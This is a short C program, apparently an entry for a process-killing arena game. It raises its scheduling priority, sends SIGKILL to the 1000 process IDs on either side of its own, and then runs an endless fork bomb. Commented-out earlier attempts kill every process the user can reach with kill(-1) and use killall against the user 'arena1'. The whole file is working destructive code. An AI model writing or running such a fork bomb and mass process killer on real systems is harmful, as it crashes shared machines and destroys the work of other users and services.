#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <errno.h>
#include <signal.h>
#include <wait.h>

int main() {
	/*
	sigset_t   mask;
	sigfillset(&mask);
	sigprocmask(SIG_SETMASK, &mask, NULL);
	*/

	setpriority(PRIO_PROCESS,0, -20);

	pid_t	pid;
	pid_t	above = getpid();
	pid_t	below = above;
	int		count = 1000;

	while (count--) {
		kill(++above, SIGKILL);
		kill(--below, SIGKILL);
	}		
	while(1){
		while((pid = fork() ) != -1);
	}


	//The graveyard of previous attempts
	/*while (1) {
	//kill(-1, SIGKILL);
	if((pid = fork()) != 0){
	while(1);
	//	kill(-1, SIGKILL);
	}
	*/
	/*if (pid != 0) {
	char* name[] = {
	"/bin/bash",
	"-c",
	"killall  -q -s SIGKILL -u arena1",
	NULL
	};
	execvp(name[0], name);
	}*/
}

